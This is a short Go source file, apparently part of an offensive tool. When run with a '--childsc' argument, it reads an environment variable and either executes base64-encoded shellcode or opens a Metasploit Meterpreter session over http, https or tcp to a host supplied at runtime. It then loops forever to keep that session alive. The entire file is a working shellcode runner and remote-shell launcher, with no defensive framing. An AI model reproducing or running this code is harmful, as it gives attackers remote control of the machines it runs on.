
package main

import (
	"os"
	"log"
	"runtime"
	"time"

	"github.com/kost/gosc/shell"
	"github.com/kost/gosc/msf"
)

func sleepForever () {
        for {
                time.Sleep(time.Second)
        }
}

func SCEnvAndExecute () {
	if len(os.Args)!=2 {
		return
	}
	if os.Args[1]!="--childsc" {
		return
	}
	ptype, ok := os.LookupEnv("T2W_CMD")
	if !ok {
		return
	}
	cmdstr, cok := os.LookupEnv("T2W_SC")
	if !cok {
		return
	}
	log.Printf("childsc: %s %s", ptype, cmdstr)
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	if ptype == "sc" {
		shell.ExecShellcode_b64(cmdstr)
	}
	if ptype == "msf-http" {
		 msf.Meterpreter("http", cmdstr)
	}
	if ptype == "msf-https" {
		 msf.Meterpreter("https", cmdstr)
	}
	if ptype == "msf-tcp" {
		 msf.Meterpreter("tcp", cmdstr)
	}

	sleepForever()
	os.Exit(0)
}


